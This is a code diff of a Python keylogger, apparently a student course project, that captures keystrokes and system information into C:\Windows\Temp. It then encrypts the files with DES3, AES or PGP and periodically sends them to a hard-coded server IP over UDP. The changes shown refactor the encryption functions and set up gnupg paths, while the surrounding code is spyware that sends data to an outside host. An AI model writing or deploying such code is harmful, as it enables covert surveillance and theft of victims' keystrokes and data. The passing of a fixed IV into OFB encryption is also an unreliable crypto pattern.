@@ -32,13 +32,14 @@ systemInfoEncrypted = "systemInfoEncrypted.txt"
 udpPort = 25005
 buffer_size = 1024
 server_ip = "35.231.244.179"  # static ip addr
-
+# path to the gnupg location
+Path_to_foldergpg = 'C:\\Users\\User\\Documents\\Winter2021\\cis350\\myKeys\\'
 # payload destination variables
 path = "C:\Windows\Temp"
 extend = "\\"
 extendedPath = path + extend
 
-#config variables
+# config variables
 name = ""
 key = ""
 syslog = False
@@ -50,6 +51,7 @@ BS = 16
 PAD = lambda s: s + (BS - len(s) % BS) * chr(BS - len(s) % BS).encode('utf-8')
 UNPAD = lambda s: s[:-ord(s[len(s) - 1:])]
 BLOCK_SIZE = 128
+
 
 def setupConfig():
     global name
@@ -213,7 +215,7 @@ while currentTime < endTime:
         currentTime = time.time()
         endTime = time.time() + logTime
 
-        #encrypt and send
+        # encrypt and send
         encryptions(key, name, email, syslog, keylog)
 
 
@@ -221,7 +223,7 @@ while currentTime < endTime:
 # PGP encryption
 
 # encrypt files
-def encryptions(key, name, email, system, keylogger):
+def encryptions(key, name, email, system, keylogger,iv):
     systemfiles_to_encrypt = [extendedPath + systemInfo]
     keyloggerfiles_to_encrypt = [extendedPath + loggedKeys]
     systemencrypted_file_names = [extendedPath + systemInfoEncrypted]
@@ -230,7 +232,7 @@ def encryptions(key, name, email, system, keylogger):
     if system:
         for encryptingFile in systemfiles_to_encrypt:
             if name == "DES3":
-                systemencrypted_file_names[count] = des3_encrypt(key, encryptingFile)
+                systemencrypted_file_names[count] = des3_encrypt(key, encryptingFile,iv)
             if name == "AES":
                 systemencrypted_file_names[count] = encrypt_aes(key, encryptingFile)
             if name == "PGP":
@@ -242,7 +244,7 @@ def encryptions(key, name, email, system, keylogger):
     if keylogger:
         for encryptingFile in keyloggerfiles_to_encrypt:
             if name == "DES3":
-                systemencrypted_file_names[count] = des3_encrypt(key, encryptingFile)
+                systemencrypted_file_names[count] = des3_encrypt(key, encryptingFile, iv)
             if name == "AES":
                 systemencrypted_file_names[count] = encrypt_aes(key, encryptingFile)
             if name == "PGP":
@@ -260,11 +262,9 @@ def encryptions(key, name, email, system, keylogger):
 # des3 encryption
 
 # encrypt files
-def des3_encrypt(key, filelist_encrypt):
-    count = 0
-    with open(filelist_encrypt[count], 'rb') as f:
+def des3_encrypt(key, filelist_encrypt,iv):
+    with open(filelist_encrypt, 'rb') as f:
         data = f.read()
-    iv = Random.new().read(DES3.block_size)  # DES3.block_size==8
     cipher_encrypt = DES3.new(key, DES3.MODE_OFB, iv)
     pad_len = 8 - len(data) % 8
     # length of padding
@@ -293,7 +293,8 @@ def encrypt_aes(key, original_file):
 def encrypt_gnupg(email, key, file_to_encrypt, encrypted_file):
     # encrypt file name original_file
     # output in the dir and the encrypt file that we entered
-    gpg = gnupg.GPG()
+    gpg = gnupg.GPG(gnupghome=Path_to_foldergpg + 'GVSU-CIS350-myKeys\\src\\bin',
+                    gpgbinary=Path_to_foldergpg + 'GVSU-CIS350-myKeys\\src\\bin\\gpg.exe')
     with open(file_to_encrypt, 'rb') as f:
         status = gpg.encrypt_file(
             f, recipients=[email],
@@ -323,6 +324,3 @@ def encrypt_gnupg(email, key, file_to_encrypt, encrypted_file):
 #         count += 1
 
 #     time.sleep(120)
-
-
-
